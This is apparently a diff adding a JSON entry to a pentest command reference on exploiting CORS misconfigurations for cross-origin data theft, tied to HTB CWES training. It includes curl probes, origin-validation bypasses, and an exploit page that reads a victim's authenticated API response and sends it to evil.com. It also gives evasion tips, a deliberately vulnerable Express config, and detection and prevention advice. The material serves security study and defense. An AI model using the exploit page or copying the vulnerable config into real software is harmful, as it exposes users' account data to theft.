@@ -1,0 +1,108 @@
+{
+  "id": "cors-misconfiguration",
+  "name": "CORS Misconfiguration - Cross-Origin Data Theft",
+  "command": "curl -s -I -H \"Origin: https://evil.com\" https://<target>/api/account",
+  "description": "A permissive CORS policy that reflects an attacker origin AND allows credentials lets a malicious page read authenticated responses from the victim's browser. Test by sending a rogue Origin and checking whether it is reflected in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true (CWES M18).",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl"
+  ],
+  "tags": [
+    "cors",
+    "api",
+    "cross-origin",
+    "acao",
+    "credentials",
+    "web"
+  ],
+  "category": "Web Exploitation",
+  "subcategory": "API Attacks",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "CWES Module 18: API Attacks",
+  "opsec": "quiet",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1190",
+    "T1539"
+  ],
+  "steps": [
+    {
+      "label": "Test 1: does the server reflect an arbitrary Origin?",
+      "command": "curl -s -I -H 'Origin: https://evil.com' https://<target>/api/account | grep -i 'access-control-allow-'"
+    },
+    {
+      "label": "Vulnerable if you see reflected origin + credentials allowed",
+      "command": "# Access-Control-Allow-Origin: https://evil.com\n# Access-Control-Allow-Credentials: true   <-- exploitable"
+    },
+    {
+      "label": "Test 2: null-origin trust (sandboxed iframe / redirects)",
+      "command": "curl -s -I -H 'Origin: null' https://<target>/api/account | grep -i 'access-control-allow-origin'"
+    },
+    {
+      "label": "Host the exploit page and lure an authenticated victim",
+      "command": "python3 -m http.server 80   # serve the HTML below"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Exploit page: steal the victim's authenticated response",
+      "command": "<script>\nfetch('https://<target>/api/account',{credentials:'include'})\n  .then(r=>r.text())\n  .then(d=>fetch('https://evil.com/log?d='+encodeURIComponent(btoa(d))));\n</script>"
+    },
+    {
+      "label": "Weak regex bypass: trusted-suffix / substring match",
+      "command": "curl -s -I -H 'Origin: https://evil-<target>' https://<target>/api/account   # or https://<target>.evil.com"
+    }
+  ],
+  "notes": "Three common broken patterns: (1) blind reflection of the Origin header into ACAO + ACAC:true = full cross-origin credentialed read (worst). (2) ACAO: null trusted = exploitable from a sandboxed iframe (<iframe sandbox=allow-scripts srcdoc=...>) which sends Origin: null. (3) weak origin validation (startswith/endswith/substring) - bypass with evil-<target>.com or <target>.evil.com. Impact needs ACAC:true (or a token the page can read) to steal authenticated data; without credentials it only exposes public data. Distinct from CSRF: CORS lets the attacker READ the response, CSRF only lets them send a request. Wildcard ACAO (*) cannot be combined with ACAC:true by spec, so pure * is lower risk.",
+  "references": [
+    {
+      "title": "HTB Academy - API Attacks",
+      "url": "https://academy.hackthebox.com/module/details/305"
+    },
+    {
+      "title": "PortSwigger - CORS",
+      "url": "https://portswigger.net/web-security/cors"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "api-enum-abuse",
+      "note": "Enumerate the API surface first",
+      "rel": "prereq"
+    }
+  ],
+  "variations": [
+    {
+      "label": "Enumerate CORS on many endpoints (spot the reflective ones)",
+      "command": "for e in account profile orders admin; do echo \"/$e:\"; curl -s -I -H 'Origin: https://evil.com' https://<target>/api/$e | grep -i access-control-allow-origin; done"
+    }
+  ],
+  "defense": {
+    "why_it_works": "CORS relaxes the Same-Origin Policy by letting the server declare which origins may read cross-origin responses. If the server reflects the request's Origin into Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true, any attacker-controlled page can make the victim's browser send its cookies to the target and read the authenticated response - defeating SOP for that endpoint.",
+    "prerequisites": "An endpoint that returns sensitive data based on the session cookie AND reflects arbitrary origins with credentials allowed (or trusts null / uses weak origin validation). A victim who visits the attacker's page while authenticated.",
+    "impact": "T1190 Exploit Public-Facing Application + T1539 Steal Web Session Cookie (effectively - reading authenticated data cross-origin). Theft of PII, tokens, or account data from any logged-in victim who opens the attacker page.",
+    "detection": "Requests carrying an external/attacker Origin header to sensitive endpoints; responses reflecting non-allowlisted origins; spikes of cross-origin credentialed requests. WAF rules matching unexpected Origin values.",
+    "artifacts": "Access logs: requests with Origin: https://evil.com (or null) to authenticated API paths; the reflected ACAO in responses.",
+    "prevention": "Use a strict server-side allowlist of exact trusted origins - never reflect the Origin header. Do not set Access-Control-Allow-Credentials: true unless required, and never with a reflected/wildcard origin. Reject Origin: null. Validate origins with exact match, not startswith/endswith/substring. Prefer same-site cookies (SameSite=Strict/Lax) as defense in depth.",
+    "evasion": "Use a plausible-looking origin that passes weak validation (trusted substring/suffix). Keep the exfil beacon small and to a benign-looking host.",
+    "sources": [
+      "HTB CWES M18",
+      "MITRE T1190",
+      "MITRE T1539",
+      "https://portswigger.net/web-security/cors"
+    ],
+    "misconfiguration": "Server reflects the Origin header into ACAO with ACAC:true, trusts Origin: null, or validates origins by substring/suffix instead of exact allowlist.",
+    "vulnerable_config": "// Express - reflects any origin WITH credentials (critical):\napp.use((req,res,next)=>{\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials','true');\n  next();\n});",
+    "secure_config": "// Strict allowlist, exact match, no credential+reflection:\nconst allow = new Set(['https://app.example.com']);\napp.use((req,res,next)=>{\n  const o = req.headers.origin;\n  if (allow.has(o)) {\n    res.header('Access-Control-Allow-Origin', o);\n    res.header('Access-Control-Allow-Credentials','true');\n    res.header('Vary','Origin');\n  }\n  next();\n});\n// Reject 'null'; set cookies SameSite=Lax/Strict."
+  },
+  "type": "command"
+}
